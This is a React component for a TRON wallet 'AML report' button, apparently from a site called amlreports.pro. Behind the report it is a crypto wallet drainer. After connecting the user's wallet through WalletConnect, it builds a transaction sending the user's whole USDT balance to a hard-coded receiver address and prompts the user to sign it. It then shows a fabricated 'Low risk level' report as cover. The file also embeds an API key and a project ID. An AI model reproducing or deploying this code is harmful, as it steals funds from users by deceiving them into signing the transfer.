// src/components/tronAuthButton/TronAuthButton.tsx
import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // <== Фикс ошибки "Buffer is not defined"

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'TGAMnB7DDQhrs5RoA7UzRBqZgUX9dkS8C6'; // <-- получатель

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});

export const TronAuthButton: React.FC = () => {
  const [status, setStatus] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  const connectWallet = async () => {
    setLoading(true);
    setStatus(null);

    try {
      await adapter.connect();

      const userAddress = adapter.address;
      if (!userAddress || !tronWeb.isAddress(userAddress)) {
        throw new Error('Invalid wallet address');
      }

      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;
      console.log('TRX balance:', trx);

      if (trx < 25) {
        throw new Error('❌ Insufficient TRX. At least 25 TRX is required.');
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;
      console.log('USDT balance:', usdt);

      if (usdt < 1) {
        setStatus('succes'); // показать отчёт без перевода
        await adapter.disconnect();
        return;
      }

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        {
          feeLimit: 25_000_000,
          callValue: 0,
        },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      const signedTx = await adapter.signTransaction(tx.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);
      console.log('Send result:', result);

      setStatus('succes');
    } catch (err: any) {
      console.error('Error:', err);
      if (
        err?.message?.includes('User rejected') ||
        err?.message?.includes('Modal is closed') ||
        err?.message?.includes('Timeout')
      ) {
        // игнорируем
      } else {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
      await adapter.disconnect();
    }
  };

  return (
    <div onClick={connectWallet} className="AuthButton">
      {loading && (
        <div className="modal__overflow">
          <div className="modal">
            <p>🔄 Connecting wallet...</p>
          </div>
        </div>
      )}

      {status && (
        <div className="modal__overflow">
          <div className="modal">
            {status !== 'succes' ? (
              <p>{status}</p>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div>
                        <span className="circ green"></span> 0–30
                      </div>
                      <div>
                        <span className="circ orange"></span> 31–69
                      </div>
                      <div>
                        <span className="circ red"></span> 70–100
                      </div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
                </div>
              </>
            )}
            <button onClick={() => setStatus(null)}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
